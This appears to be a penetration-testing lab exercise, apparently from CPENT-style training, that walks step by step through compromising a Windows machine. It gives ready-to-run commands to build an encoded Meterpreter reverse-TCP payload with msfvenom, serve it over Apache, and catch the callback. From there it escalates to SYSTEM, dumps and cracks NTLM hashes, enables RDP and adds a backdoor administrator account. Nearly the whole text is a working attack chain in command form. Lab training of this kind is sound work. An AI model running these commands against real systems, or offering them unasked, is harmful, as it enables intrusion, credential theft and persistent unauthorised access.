# Exercise 3: Exploiting and Escalating Privileges on a Windows Operating System

## Objective

In this exercise, we will learn how to:

- Exploit a vulnerable Windows machine
- Generate and deliver a Meterpreter payload
- Gain a Meterpreter session
- Escalate privileges to SYSTEM
- Dump Windows password hashes
- Crack NTLM password hashes using John the Ripper
- Enable Remote Desktop (RDP)
- Create a new Windows user
- Connect to the target machine using Remmina

---

# Lab Topology

```text
Attacker Machine
-----------------
Parrot Security
IP: 172.19.19.18

        │
        │ Reverse TCP Connection
        ▼

Victim Machine
-----------------
Windows
IP: 172.19.19.15
```

---

# Workflow

```text
Generate Payload
        │
        ▼
Host Payload using Apache
        │
        ▼
Start Metasploit Listener
        │
        ▼
Victim Executes Payload
        │
        ▼
Meterpreter Session
        │
        ▼
Privilege Escalation
        │
        ▼
Dump Password Hashes
        │
        ▼
Crack Password Hashes
        │
        ▼
Enable Remote Desktop
        │
        ▼
Create RDP User
        │
        ▼
Connect using Remmina
```

---

# Step 1: Become Root

```bash
sudo su
```

Password

```text
toor
```

Purpose:
Obtain root privileges in Parrot Security.

---

# Step 2: Generate Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' lhost=172.19.19.18 lport=443 -f exe > /home/pentester/Desktop/shikata.exe
```

Purpose:

- Creates a Windows executable payload.
- Uses Meterpreter Reverse TCP.
- Encodes payload using shikata_ga_nai.
- Saves payload as **shikata.exe**.

Output:

```
Desktop/shikata.exe
```

---

# Step 3: Start Apache Server

```bash
service apache2 start
```

Purpose:

Starts the Apache web server to share files.

---

# Step 4: Create Share Folder

```bash
mkdir /var/www/html/share
```

Purpose:

Creates a directory for hosting the payload.

---

# Step 5: Set Folder Permission

```bash
chmod -R 755 /var/www/html/share/
```

Purpose:

Allows the web server to access and serve files.

---

# Step 6: Copy Payload

```bash
cp /home/pentester/Desktop/shikata.exe /var/www/html/share
```

Purpose:

Copies the payload into the Apache web directory.

Victim downloads:

```
http://172.19.19.18/share/shikata.exe
```

---

# Step 7: Launch Metasploit

```bash
msfconsole
```

Purpose:

Starts the Metasploit Framework.

---

# Step 8: Use Multi Handler

```bash
use exploit/multi/handler
```

Purpose:

Starts a listener waiting for reverse Meterpreter connections.

---

# Step 9: Configure Payload

```bash
set payload windows/meterpreter/reverse_tcp
```

```bash
set lhost 172.19.19.18
```

```bash
set lport 443
```

Verify configuration

```bash
show options
```

Purpose:

Configures the handler to match the payload.

---

# Step 10: Start Listener

```bash
exploit
```

Purpose:

Starts the reverse TCP handler and waits for the victim.

---

# Step 11: Victim Executes Payload

Victim downloads

```
shikata.exe
```

↓

Runs it

↓

Reverse connection established

↓

Meterpreter session opens

---

# Step 12: Privilege Escalation

```bash
getsystem
```

Purpose:

Attempts to elevate privileges to

```
NT AUTHORITY\SYSTEM
```

---

# Step 13: Dump Password Hashes

```bash
run post/windows/gather/hashdump
```

Purpose:

Extracts LM and NTLM password hashes from the Windows SAM database.

---

# Step 14: Save Hashes

Open Pluma.

Copy only these users

- rebecca
- steve
- sam
- anderson

Paste into Pluma.

Save as

```
hashes.txt
```

Desktop location.

---

# Step 15: Disable CPUID

```bash
export CPUID_DISABLE=1
```

Purpose:

Runs John the Ripper in compatibility mode to avoid CPU detection issues in virtual machines.

---

# Step 16: Crack NTLM Hashes

```bash
sudo john --format=nt /home/pentester/Desktop/hashes.txt
```

Password

```
toor
```

Purpose:

Cracks Windows NTLM password hashes and reveals the original passwords.

---

# Step 17: Enable Remote Desktop

```bash
run post/windows/manage/enable_rdp
```

Purpose:

Enables Remote Desktop on the Windows target.

---

# Step 18: Switch to Windows Shell

```bash
shell
```

Purpose:

Opens the Windows Command Prompt from Meterpreter.

---

# Step 19: Create a New User

```cmd
net user CPENT cpentpw@123 /add
```

Purpose:

Creates a Windows user named **CPENT**.

---

# Step 20: Add User to Remote Desktop Users

```cmd
net localgroup "Remote Desktop Users" CPENT /add
```

Purpose:

Allows the user to log in using Remote Desktop.

---

# Step 21: Add User to Administrators

```cmd
net localgroup "Administrators" CPENT /add
```

Purpose:

Grants administrator privileges to the CPENT user.

---

# Step 22: Connect using Remmina

Open:

```
Menu
    ↓
Remmina
```

Protocol:

```
RDP
```

Target IP

```
172.19.19.15
```

Username

```
CPENT
```

Password

```
cpentpw@123
```

Click

```
Connect
```

Windows Desktop appears.

---

# Important Commands Summary

| Command | Purpose |
|----------|---------|
| sudo su | Become root |
| msfvenom | Generate Meterpreter payload |
| service apache2 start | Start Apache server |
| mkdir | Create share folder |
| chmod | Set folder permissions |
| cp | Copy payload |
| msfconsole | Launch Metasploit |
| use exploit/multi/handler | Start listener |
| set payload | Select payload |
| set lhost | Set attacker IP |
| set lport | Set listening port |
| exploit | Start handler |
| getsystem | Privilege escalation |
| hashdump | Dump password hashes |
| export CPUID_DISABLE=1 | Compatibility mode for John |
| john | Crack NTLM hashes |
| enable_rdp | Enable Remote Desktop |
| shell | Open Windows CMD |
| net user | Create Windows user |
| net localgroup | Add user to groups |

---

# Important Concepts

### Meterpreter

An advanced shell that provides post-exploitation capabilities.

---

### Reverse TCP

Victim initiates the connection back to the attacker.

---

### Privilege Escalation

Obtaining SYSTEM-level privileges after gaining initial access.

---

### Hashdump

Extracts LM and NTLM password hashes from the Windows SAM database.

---

### John the Ripper

A password-cracking tool that converts password hashes back into plaintext passwords (when they can be cracked).

---

### RDP (Remote Desktop Protocol)

Allows remote graphical access to a Windows machine.

---

### Remmina

A Remote Desktop client on Linux used to connect to Windows systems via RDP.

---

# Complete Lab Summary

```text
Gain Root on Parrot
        │
Generate Meterpreter Payload
        │
Host Payload with Apache
        │
Configure Metasploit Listener
        │
Victim Executes Payload
        │
Meterpreter Session Established
        │
Privilege Escalation (SYSTEM)
        │
Dump Password Hashes
        │
Save hashes.txt
        │
Crack Hashes using John
        │
Enable Remote Desktop
        │
Create New User
        │
Grant RDP & Admin Permissions
        │
Connect using Remmina
        │
Full Remote Desktop Access Achieved
```

---

# Viva Questions

### Why do we use Meterpreter?

To obtain an interactive shell and perform post-exploitation tasks.

### Why use Reverse TCP?

The victim initiates the connection, making it more likely to pass through firewalls.

### Why run `getsystem`?

To gain SYSTEM privileges and access protected resources.

### Why use `hashdump`?

To extract LM and NTLM password hashes from the SAM database.

### Why use John the Ripper?

To crack NTLM hashes and recover plaintext passwords.

### Why enable RDP?

To gain graphical remote access to the Windows machine.

### Why create a new user?

To ensure a user with RDP and Administrator permissions is available for login.

### Why use Remmina?

To remotely connect from the Parrot Linux machine to the Windows target using the RDP protocol.
